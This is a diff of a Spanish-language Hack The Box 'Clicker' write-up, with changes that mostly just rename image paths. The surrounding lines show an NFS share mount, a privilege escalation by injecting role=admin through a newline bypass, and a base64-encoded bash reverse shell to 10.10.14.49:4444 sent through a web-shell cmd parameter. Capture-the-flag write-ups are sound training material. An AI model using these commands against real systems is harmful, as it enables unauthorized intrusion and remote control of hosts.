@@ -3,7 +3,7 @@ title: "Clicker - WriteUp"
 date: Mon Oct 21 2024 19:30:00 GMT+0200 (Central European Summer Time)
 categories: [WriteUps, HTB, Linux]
 tags: [ctf, nmap, htb, sudo, exploit, apache, php, linux, ssh, bash]
-image: /assets/img/htb-writeups/Pasted image 20240120131231.png
+image: /assets/img/htb-writeups/Pasted-image-20240120131231.png
 ---
 
 {% include machine-info.html
@@ -13,11 +13,11 @@ image: /assets/img/htb-writeups/Pasted image 20240120131231.png
   platform="HTB"
 %}
 
-![Clicker](/assets/img/htb-writeups/Pasted image 20240120131231.png)
+![Clicker](/assets/img/htb-writeups/Pasted-image-20240120131231.png)
 
 ------
 
-![CLICKER](/assets/img/htb-writeups/Pasted image 20240120131231.png)
+![CLICKER](/assets/img/htb-writeups/Pasted-image-20240120131231.png)
 
 ------
 
@@ -74,19 +74,19 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 HTTP
 
-![CLICKER](/assets/img/htb-writeups/Pasted image 20240120132314.png)
+![CLICKER](/assets/img/htb-writeups/Pasted-image-20240120132314.png)
 
 Si pulsamos sobre info nos sale este banner de posibles usuarios:
 
-![CLICKER](/assets/img/htb-writeups/Pasted image 20240120132435.png)
+![CLICKER](/assets/img/htb-writeups/Pasted-image-20240120132435.png)
 
 Si nos registramos podemos jugar a un juego que cuenta clics con el ratón:
 
-![CLICKER](/assets/img/htb-writeups/Pasted image 20240120132826.png)
+![CLICKER](/assets/img/htb-writeups/Pasted-image-20240120132826.png)
 
 Y también guarda nuestro progreso en un perfil:
 
-![CLICKER](/assets/img/htb-writeups/Pasted image 20240120132908.png)
+![CLICKER](/assets/img/htb-writeups/Pasted-image-20240120132908.png)
 
 Nos llama el atención el puerto 111. Vamos a intentar enumerarlo:
 
@@ -155,7 +155,7 @@ sudo mkdir /mnt/clicker
 sudo mount -t nfs -o vers=3 10.129.10.191:/mnt/backups /mnt/clicker -o nolock
 ```
 
-![CLICKER](/assets/img/htb-writeups/Pasted image 20240120134156.png)
+![CLICKER](/assets/img/htb-writeups/Pasted-image-20240120134156.png)
 
 Nos copiamos el archivo .zip a nuestra ruta de trabajo e intentamos descomprimirla.
 
@@ -163,76 +163,76 @@ Nos copiamos el archivo .zip a nuestra ruta de trabajo e intentamos descomprimir
 $ cp clicker.htb_backup.zip /home/andy/HTB/Clicker/content
 ```
 
-![CLICKER](/assets/img/htb-writeups/Pasted image 20240120134345.png)
+![CLICKER](/assets/img/htb-writeups/Pasted-image-20240120134345.png)
 
 Parece que tenemos una copia de seguridad de la web. Vamos a investigar un poco en los archivos.
 
 En el archivo "save_game.php" nos llama la atención un comentario que dejó el desarrollador:
 
-![CLICKER](/assets/img/htb-writeups/Pasted image 20240120140049.png)
+![CLICKER](/assets/img/htb-writeups/Pasted-image-20240120140049.png)
 
 Vamos a capturar con _BurpSuite_ esta petición y a ver qué podemos hacer.
 
-![CLICKER](/assets/img/htb-writeups/Pasted image 20240120140349.png)
+![CLICKER](/assets/img/htb-writeups/Pasted-image-20240120140349.png)
 
 Tenemos por una parte el parámetro "clicks" y por otra el parámetro "level". Vamos a intentar modificarlo y ver si salta el aviso del código en PHP.
 
 Si modificamos "level" nos deja hacerlo sin problema:
 
-![CLICKER](/assets/img/htb-writeups/Pasted image 20240120140634.png)
+![CLICKER](/assets/img/htb-writeups/Pasted-image-20240120140634.png)
 
 De hecho nos lo refleja en nuestro profile:
 
-![CLICKER](/assets/img/htb-writeups/Pasted image 20240120140730.png)
+![CLICKER](/assets/img/htb-writeups/Pasted-image-20240120140730.png)
 
 Hablando de profiles... Si volvemos al archivo PHP vemos que existe un parámetro llamado "role":
 
-![CLICKER](/assets/img/htb-writeups/Pasted image 20240120141213.png)
+![CLICKER](/assets/img/htb-writeups/Pasted-image-20240120141213.png)
 
 Vamos a intentar incluirlo en nuestra petición poniéndole como valor "admin".
 
-![CLICKER](/assets/img/htb-writeups/Pasted image 20240120142056.png)
+![CLICKER](/assets/img/htb-writeups/Pasted-image-20240120142056.png)
 
 Y obtenemos la respuesta que esperábamos:
 
-![CLICKER](/assets/img/htb-writeups/Pasted image 20240120142135.png)
+![CLICKER](/assets/img/htb-writeups/Pasted-image-20240120142135.png)
 
 Está claro que es por aquí por donde podemos entrarle, ahora hay que investigar un poco para saber cómo hacerlo.
 Encontramos información en la página HackTricks https://book.hacktricks.xyz/pentesting-web/crlf-0d-0a y haciendo pruebas, encontramos la forma de hacer bypass a la protección, ya que no está contemplado el retorno de carro "/n" en este caso lo representamos como "%0a".
 
-![CLICKER](/assets/img/htb-writeups/Pasted image 20240120142638.png)
+![CLICKER](/assets/img/htb-writeups/Pasted-image-20240120142638.png)
 
 Y esta vez sí se lo ha tragado.
 
-![CLICKER](/assets/img/htb-writeups/Pasted image 20240120142718.png)
+![CLICKER](/assets/img/htb-writeups/Pasted-image-20240120142718.png)
 
 Nos deslogueamos y volvemos a entrar. Esta vez nos salen nuevas opciones:
 
-![CLICKER](/assets/img/htb-writeups/Pasted image 20240120151351.png)
+![CLICKER](/assets/img/htb-writeups/Pasted-image-20240120151351.png)
 
 Tenemos acceso a admin.php con posibilidad de exportarlo a diferentes formatos, txt, jason y html.
 
-![CLICKER](/assets/img/htb-writeups/Pasted image 20240120151435.png)
+![CLICKER](/assets/img/htb-writeups/Pasted-image-20240120151435.png)
 
 Pulsamos sobre "Export" y nos devuelve el siguiente mensaje:
 
-![CLICKER](/assets/img/htb-writeups/Pasted image 20240120151802.png)
+![CLICKER](/assets/img/htb-writeups/Pasted-image-20240120151802.png)
 
 Vamos a la ruta donde se ha exportado el archivo de texto y vemos lo siguiente:
 
-![CLICKER](/assets/img/htb-writeups/Pasted image 20240120151953.png)
+![CLICKER](/assets/img/htb-writeups/Pasted-image-20240120151953.png)
 
 No vemos nada que nos pueda ayudar por ahora. 
 
 En el código de "export.php" vemos que contempla la exportación en txt y json si no lo exporta con mucha más información.
 
-![CLICKER](/assets/img/htb-writeups/Pasted image 20240120152844.png)
+![CLICKER](/assets/img/htb-writeups/Pasted-image-20240120152844.png)
 
 Vamos a volver a capturar la ejecución de "Export" para ver qué hace si le ponemos otra extensión que no esté contemplada, por ejemplo la última opción que es .html
 
 Hacemos el proceso y nos lleva a una página html con la misma información prácticamente...
 
-![CLICKER](/assets/img/htb-writeups/Pasted image 20240120153632.png)
+![CLICKER](/assets/img/htb-writeups/Pasted-image-20240120153632.png)
 
 Creo que es un rabbit hole, sigamos investigando los archivos .php
 
@@ -250,9 +250,9 @@ $ echo "sh -i >& /dev/tcp/10.10.14.49/4444 0>&1" | base64
 http://clicker.htb/exports/top_players_7pn1q9b2.php?cmd=echo%20%22c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNDkvNDQ0NCAwPiYxCg==%22%20|%20base64%20-d%20|%20bash
 ```
 
-![CLICKER](/assets/img/htb-writeups/Pasted image 20240120155453.png)
+![CLICKER](/assets/img/htb-writeups/Pasted-image-20240120155453.png)
 
-![CLICKER](/assets/img/htb-writeups/Pasted image 20240120155737.png)
+![CLICKER](/assets/img/htb-writeups/Pasted-image-20240120155737.png)
 
 ```
 -----BEGIN OPENSSH PRIVATE KEY-----
@@ -300,7 +300,7 @@ $ chmod 600 id_rsa
 $ ssh -i id_rsa jack@10.129.10.191
 ```
 
-![CLICKER](/assets/img/htb-writeups/Pasted image 20240120161405.png)
+![CLICKER](/assets/img/htb-writeups/Pasted-image-20240120161405.png)
 
 Y entramos como Jack. Registramos bandera y continuamos.
 
